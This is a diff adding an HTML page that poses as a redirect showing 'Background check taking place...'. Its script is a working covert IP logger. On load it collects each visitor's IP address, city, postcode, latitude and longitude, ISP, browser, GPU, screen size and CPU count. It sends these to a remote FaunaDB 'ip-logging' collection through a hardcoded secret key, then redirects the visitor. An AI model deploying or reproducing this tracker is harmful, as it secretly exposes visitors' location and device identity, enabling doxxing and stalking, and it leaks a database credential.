@@ -1,0 +1,103 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+        <title>Redirecting...</title>
+        <meta property="og:type" content="website">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+        <link href="https://fonts.googleapis.com/css?family=Red+Hat+Text" rel="stylesheet">
+        <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/faunadb@latest/dist/faunadb.js"></script>
+    </head>
+    <body onload="start()">
+Background check taking place...
+  </body>
+    <script>
+        var faunadb = window.faunadb
+  var q = faunadb.query
+  var client = new faunadb.Client({
+    secret: 'fnAEal0BqXAAwLecNTQaO4CXREXT-zzVC9Knp85g',
+    domain: 'db.eu.fauna.com',
+    scheme: 'https',
+  })
+
+async function start(){
+
+    var segments = window.location.href.split('?')
+let name = segments[1]
+
+    client.query(
+  q.Get(
+    q.Match(q.Index('get_url'), name)
+  )
+)
+.then(async function(ret){ 
+    
+    var browser = "Unknown"
+
+  if((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf('OPR')) != -1 ) {
+        browser = 'Opera';
+    } else if(navigator.userAgent.indexOf("Chrome") != -1 ) {
+        browser = 'Chrome';
+    } else if(navigator.userAgent.indexOf("Safari") != -1) {
+        browser = 'Safari';
+    } else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+        browser = 'Firefox';
+    } else if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) {
+        browser = 'Internet Explorer';
+    } else {
+        browser = 'Unknown';
+    }
+
+    let gpu = "";
+const gl = document.createElement('canvas').getContext('webgl');
+  if (!gl) {
+    gpu = "Unknown"
+  }
+  const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+ gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+
+ if(gpu == null)
+ {
+   gpu = "Unknown"
+ }
+
+    var response = await fetch("https://ipapi.co/json")
+    const data = await response.json()
+let date = new Date();
+console.log(ret)
+    client.query(
+  q.Update(
+    q.Ref(q.Collection('ip-logging'), ret.ref.id),
+    {
+      data: {
+        logs:  ret.data.logs + "!!!newlog!!!" + "IP: <b>" + data.ip + "</b> <i>[" + data.version + "]</i>" + "\nRough Area: <b>" + data.city + ", " + data.region + "</b> <i>[" + data.country_name + "]</i>" + "\nPostcode: <b>" + data.postal + "</b>\nLat/Long: <b>" + data.latitude + ", " + data.longitude + "</b>\nProvider: <b>" + data.org + "</b><i> [ASN: " + data.asn + "]</i>\nBrowser: <b>" + browser + "</b>\nPlatform: <b>" + navigator.platform + "</b>\nScreen Size: <b>" + window.screen.width + " &times; " + window.screen.height + "</b>\nGraphics Card Name / Driver: <b>" + gpu + "</b>\nNumber of CPU Threads / Cores: <b>" + navigator.hardwareConcurrency + "</b>" + "!!!time!!!" + date.toUTCString() + "!!!time!!!"
+      },
+    },
+  )
+)
+.then(function(ret){
+     
+     console.log(ret)
+     window.location.href = ret.data.redirect
+    
+    
+  })
+.catch((err) => console.error('Error: %s', err)) 
+
+
+           }
+)
+  
+.catch(function(e){
+           })
+
+      
+      
+        }
+        
+
+    </script>
+</html>
